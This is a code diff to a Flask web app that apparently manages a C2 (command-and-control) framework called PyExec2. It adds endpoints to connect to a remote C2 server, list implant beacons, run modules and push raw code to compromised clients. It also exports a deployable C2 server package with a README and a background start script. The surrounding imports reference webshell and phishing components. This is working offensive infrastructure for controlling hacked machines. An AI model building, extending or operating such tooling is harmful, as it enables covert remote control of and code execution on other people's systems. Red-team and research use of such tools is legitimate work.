@@ -8,6 +8,7 @@ from typing import Any, Dict
 from flask import jsonify, render_template, request, Response
 
 from flowscan import c2_bridge
+from flowscan import c2_remote
 from flowscan import webshell as ws
 from flowscan import phishing_bridge
 from flowscan.config import load_yaml
@@ -54,6 +55,60 @@ def _ws_safe(conn: dict) -> dict:
     out = dict(conn)
     out["password"] = "****" if out.get("password") else ""
     return out
+
+
+def _export_readme(host, server_port, client_port, client_key) -> str:
+    """独立 server 部署说明(随导出 zip 附带)。"""
+    return f"""# PyExec2 C2 Server — 独立部署说明
+
+本包为导出的 C2 server 独立部署包（含完整代码 + 配置）。
+
+## 启动
+
+    chmod +x start.sh && ./start.sh
+    # 或直接:
+    python3 server.py --headless
+
+要求: Python 3.10+（纯标准库,无需 pip 安装依赖）。
+
+## 端口
+
+  - {server_port}  implant(beacon) 回连端口
+  - {client_port}  client 远程管理端口（本界面远程模式连接此端口）
+
+若端口冲突,编辑 config.json 修改 server_port / client_port 后重启。
+
+## 远程管理（远程模式）
+
+在 FlowScan 的 C2 管理页打开「远程模式」,填写:
+
+  - 远端地址: <本服务器IP>:{client_port}
+  - 密钥: {client_key or "<未生成> 本机执行: python3 server.py 后控制台 s_exec keygen,或 web 端导出配置自动生成>"}
+
+## Beacon 密钥
+
+implant_key: {"" or "(见 config.json implant_key)"}
+生成 implant 部署命令请在本机 web 端 C2 管理页「部署向导」完成。
+
+## 安全提示
+
+  - client_key / implant_key 等同服务器口令,泄露即失守
+  - 建议仅监听内网/经防火墙放行
+"""
+
+
+def _export_start_sh() -> str:
+    """独立 server 启动脚本。"""
+    return """#!/bin/sh
+# PyExec2 C2 Server 独立启动脚本（headless,后台运行）
+cd "$(dirname "$0")"
+if [ -n "$(command -v nohup)" ]; then
+    nohup python3 server.py --headless >> server.log 2>&1 &
+    echo "C2 server 已后台启动 (pid $!),日志: server.log"
+else
+    python3 server.py --headless
+fi
+"""
 
 
 def register(app):
@@ -946,3 +1001,160 @@ def register(app):
             except Exception:
                 continue
         return jsonify({"ok": True, "count": len(entries), "audit": entries})
+
+    # ══════════ C2 远程模式（client 连接远端独立 server） ══════════
+
+    @app.route("/api/c2/remote/status")
+    @login_required
+    def c2_remote_status():
+        st = c2_remote.status()
+        st["ok"] = True
+        return jsonify(st)
+
+    @app.route("/api/c2/remote/connect", methods=["POST"])
+    @login_required
+    def c2_remote_connect():
+        data = request.get_json(silent=True) or {}
+        url = str(data.get("url") or "").strip()
+        key = str(data.get("key") or "").strip()
+        if not url:
+            return jsonify({"ok": False, "error": "请输入远端地址(host:port)"}), 400
+        ok, msg = c2_remote.connect(url, key)
+        _c2_audit(app.config["get_redis"](), f"remote connect {url}", msg)
+        return jsonify({"ok": ok, "message": msg}), (200 if ok else 400)
+
+    @app.route("/api/c2/remote/disconnect", methods=["POST"])
+    @login_required
+    def c2_remote_disconnect():
+        ok, msg = c2_remote.disconnect()
+        _c2_audit(app.config["get_redis"](), "remote disconnect", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/c2/remote/command", methods=["POST"])
+    @login_required
+    def c2_remote_command():
+        data = request.get_json(silent=True) or {}
+        line = str(data.get("line") or "").strip()
+        if not line:
+            return jsonify({"ok": False, "error": "命令为空"}), 400
+        ok, out = c2_remote.command(line)
+        _c2_audit(app.config["get_redis"](), f"remote cmd {line[:200]}", out[:200])
+        return jsonify({"ok": ok, "output": out}), (200 if ok else 400)
+
+    @app.route("/api/c2/remote/beacons")
+    @login_required
+    def c2_remote_beacons():
+        ok, out = c2_remote.list_beacons()
+        if not ok:
+            return jsonify({"ok": False, "error": out}), 400
+        return jsonify({"ok": True, "beacons": out})
+
+    @app.route("/api/c2/remote/beacon/<client_id>")
+    @login_required
+    def c2_remote_beacon_detail(client_id):
+        ok, out = c2_remote.beacon_detail(client_id)
+        if not ok:
+            return jsonify({"ok": False, "error": out}), 400
+        return jsonify({"ok": True, "detail": out})
+
+    @app.route("/api/c2/remote/modules")
+    @login_required
+    def c2_remote_modules():
+        ok, out = c2_remote.list_modules()
+        if not ok:
+            return jsonify({"ok": False, "error": out}), 400
+        return jsonify({"ok": True, "modules": out})
+
+    @app.route("/api/c2/remote/exec", methods=["POST"])
+    @login_required
+    def c2_remote_exec():
+        data = request.get_json(silent=True) or {}
+        client_id = str(data.get("client_id") or "")
+        name = str(data.get("name") or "")
+        args = data.get("args") or []
+        if not isinstance(args, list):
+            args = [str(args)]
+        args = [str(a) for a in args]
+        ok, out = c2_remote.exec_module(client_id, name, args)
+        _c2_audit(app.config["get_redis"](),
+                  f"remote exec {name} {args} -> {client_id}", out[:200])
+        return jsonify({"ok": ok, "output": out}), (200 if ok else 400)
+
+    @app.route("/api/c2/remote/raw", methods=["POST"])
+    @login_required
+    def c2_remote_raw():
+        data = request.get_json(silent=True) or {}
+        client_id = str(data.get("client_id") or "")
+        code = str(data.get("code") or "")
+        if not code:
+            return jsonify({"ok": False, "error": "代码为空"}), 400
+        ok, out = c2_remote.push_raw(client_id, code)
+        _c2_audit(app.config["get_redis"](), f"remote raw -> {client_id}",
+                  out[:200])
+        return jsonify({"ok": ok, "output": out}), (200 if ok else 400)
+
+    # ══════════ C2 一键导出配置（独立 server 部署包） ══════════
+
+    @app.route("/api/c2/export-config")
+    @login_required
+    def c2_export_config():
+        """导出独立可部署的 C2 server 配置包(zip): 代码 + config.json +
+        README + start.sh。在另一台服务器解压后 python3 server.py 即可启动,
+        本界面可用远程模式(client_url + client_key)连接管理。"""
+        import io
+        import zipfile
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        root = c2cfg.get("project_root") or ""
+        if not root or not os.path.isdir(root):
+            return jsonify({"ok": False,
+                            "error": "c2 project_root 不存在,请检查 config.yaml"}), 400
+        cfg_file = os.path.join(root, c2cfg.get("config_file") or "config.json")
+        # client_key 未生成则自动生成(远端 client 连接需要)
+        try:
+            with open(cfg_file, encoding="utf-8") as f:
+                srv_cfg = json.load(f)
+        except Exception:
+            srv_cfg = {}
+        if not srv_cfg.get("client_key") and c2_bridge.c2_running():
+            okk, msg = c2_bridge.generate_client_key()
+            if okk:
+                try:
+                    with open(cfg_file, encoding="utf-8") as f:
+                        srv_cfg = json.load(f)
+                except Exception:
+                    pass
+        client_key = srv_cfg.get("client_key") or ""
+        client_port = srv_cfg.get("client_port") or 65504
+        server_port = srv_cfg.get("server_port") or 65503
+        implant_key = srv_cfg.get("implant_key") or ""
+        host = srv_cfg.get("server_host") or "0.0.0.0"
+
+        readme = _export_readme(host, server_port, client_port, client_key)
+        start_sh = _export_start_sh()
+
+        buf = io.BytesIO()
+        skip_dirs = {"__pycache__", ".git", "data"}
+        skip_files = {"events.jsonl", "server.log", "console.log"}
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for dirpath, dirnames, filenames in os.walk(root):
+                dirnames[:] = [d for d in dirnames if d not in skip_dirs]
+                rel = os.path.relpath(dirpath, root)
+                for fn in filenames:
+                    if fn in skip_files or fn.endswith(".log"):
+                        continue
+                    full = os.path.join(dirpath, fn)
+                    arc = os.path.join("c2_server", rel, fn) if rel != "." \
+                        else os.path.join("c2_server", fn)
+                    try:
+                        zf.write(full, arc)
+                    except OSError:
+                        continue
+            zf.writestr("c2_server/README.md", readme)
+            zf.writestr("c2_server/start.sh", start_sh)
+        buf.seek(0)
+        _c2_audit(app.config["get_redis"](), "export-config",
+                  f"zip {len(buf.getvalue())} bytes")
+        return Response(buf.getvalue(), mimetype="application/zip",
+                        headers={"Content-Disposition":
+                                 "attachment; filename=c2_server_export.zip"})
